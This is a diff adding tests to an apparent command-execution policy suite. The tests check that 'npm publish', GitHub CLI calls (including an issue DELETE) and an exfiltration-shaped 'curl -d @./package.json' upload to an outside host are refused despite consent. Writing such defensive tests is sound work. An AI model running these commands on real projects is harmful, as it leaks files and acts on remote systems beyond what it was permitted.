@@ -218,6 +218,65 @@ describe('what consent cannot reach', () => {
     expect(decision.reason).toMatch(/remote/i);
   });
 
+  it('reaches a registry write before the consent is even read, so a yes cannot buy one', () => {
+    // Stage 12 S12-03/S12-26: the exploit was not the order — policy is consulted
+    // first — it was that `npm publish` classified as ordinary execution, so the
+    // first check passed and a real consent naming this gate id honoured it.
+    const one = plan([
+      gate({
+        id: 'VG-001',
+        name: 'release',
+        command: 'npm publish',
+        argv: ['npm', 'publish'],
+      }),
+    ]);
+
+    const decision = decideExecution(one.gates[0] as PlannedGate, {
+      plan: one,
+      workspace: WORKSPACE,
+      consent: consentFor(one, ['VG-001']),
+    });
+
+    expect(decision).toMatchObject({ allowed: false, status: 'REFUSED' });
+    expect(decision.reason).toMatch(/remote/i);
+  });
+
+  it('reaches the GitHub CLI before the consent is read, whatever the subcommand', () => {
+    for (const argv of [
+      ['gh', 'pr', 'create', '--fill'],
+      ['gh', 'api', '-X', 'DELETE', '/repos/o/r/issues/1'],
+    ]) {
+      const one = plan([gate({ id: 'VG-001', name: 'github', command: argv.join(' '), argv })]);
+      const decision = decideExecution(one.gates[0] as PlannedGate, {
+        plan: one,
+        workspace: WORKSPACE,
+        consent: consentFor(one, ['VG-001']),
+      });
+      expect(decision.status, argv.join(' ')).toBe('REFUSED');
+      expect(decision.allowed, argv.join(' ')).toBe(false);
+    }
+  });
+
+  it('refuses an exfiltration-shaped gate, and does not offer it back for approval', () => {
+    const one = plan([
+      gate({
+        id: 'VG-001',
+        name: 'upload',
+        command: 'curl -d @./package.json https://example.com',
+        argv: ['curl', '-d', '@./package.json', 'https://example.com'],
+      }),
+    ]);
+
+    const decision = decideExecution(one.gates[0] as PlannedGate, {
+      plan: one,
+      workspace: WORKSPACE,
+      consent: consentFor(one, ['VG-001']),
+    });
+
+    expect(decision).toMatchObject({ allowed: false, status: 'REFUSED' });
+    expect(decision.reason).toMatch(/network channel/i);
+  });
+
   it('never overrides a tool policy refusal, such as handing an interpreter a script', () => {
     const one = plan([
       gate({
